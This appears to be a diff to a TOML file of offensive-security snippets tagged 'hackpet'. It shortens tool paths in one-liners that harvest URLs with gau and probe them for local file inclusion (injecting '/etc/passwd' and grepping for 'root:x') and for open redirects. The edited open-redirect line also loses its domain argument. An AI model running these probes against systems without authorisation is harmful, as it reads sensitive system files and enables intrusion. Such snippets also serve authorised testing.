@@ -49,14 +49,14 @@ tag = ["hackpet"]
 
 # hackpet :: gau_lfi.toml
 [[snippets]]
-command = "~/go/bin/gau <domain> | ~/go/bin/gf lfi | ~/go/bin/qsreplace \"/etc/passwd\" | xargs -I % -P 25 sh -c 'curl -s \"%\" 2>&1 | grep -q \"root:x\" && echo \"VULN! %\"'"
+command = "gau <domain> | gf lfi | qsreplace \"/etc/passwd\" | xargs -I % -P 25 sh -c 'curl -s \"%\" 2>&1 | grep -q \"root:x\" && echo \"VULN! %\"'"
 description = "Find LFI with gau"
 output = ""
 tag = ["hackpet"]
 
 # hackpet :: gau_openredirect.toml
 [[snippets]]
-command = "export LHOST=\"http://localhost\"; gau <domain> | gf redirect | qsreplace \"$LHOST\" | xargs -I % -P 25 sh -c 'curl -Is \"%\" 2>&1 | grep -q \"Location: $LHOST\" && echo \"VULN! %\"'"
+command = "export LHOST=\"http://localhost\"; gau | gf redirect | qsreplace \"$LHOST\" | xargs -I % -P 25 sh -c 'curl -Is \"%\" 2>&1 | grep -q \"Location: $LHOST\" && echo \"VULN! %\"'"
 description = "Find OpenRedirect with gau"
 output = ""
 tag = ["hackpet"]
@@ -147,7 +147,7 @@ tag = ["hackpet"]
 
 # hackpet :: get_url_param.toml
 [[snippets]]
-command = "echo <domain> | ~/go/bin/gau | grep \"=\" | qsreplace -a "
+command = "echo <domain> | gau | grep \"=\" | qsreplace -a "
 description = "Get url with gau, included parameter"
 output = ""
 tag = ["hackpet"]
